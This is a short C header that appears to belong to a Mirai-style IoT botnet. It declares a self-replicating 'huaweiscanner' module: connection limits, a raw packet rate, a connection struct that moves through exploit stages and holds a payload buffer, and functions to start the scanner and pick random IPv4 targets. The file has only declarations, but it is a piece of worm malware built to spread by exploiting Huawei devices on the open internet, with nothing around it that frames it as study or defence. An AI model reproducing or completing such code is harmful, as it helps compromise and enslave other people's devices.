#ifdef SELFREP

#pragma once

#include <stdint.h>

#include "includes.h"

#define huaweiscanner_SCANNER_MAX_CONNS 316
#define huaweiscanner_SCANNER_RAW_PPS 2840

#define huaweiscanner_SCANNER_RDBUF_SIZE 12800
#define huaweiscanner_SCANNER_HACK_DRAIN 64

struct huaweiscanner_scanner_connection
{
    int fd, last_recv;
    enum
    {
        huaweiscanner_SC_CLOSED,
        huaweiscanner_SC_CONNECTING,
        huaweiscanner_SC_EXPLOIT_STAGE2,
        huaweiscanner_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[huaweiscanner_SCANNER_RDBUF_SIZE];
    char payload_buf[2024];
};

void huaweiscanner_scanner_init();
void huaweiscanner_scanner_kill(void);

static void huaweiscanner_setup_connection(struct huaweiscanner_scanner_connection *);
static ipv4_t huaweiscanner_get_random_ip(void);

#endif
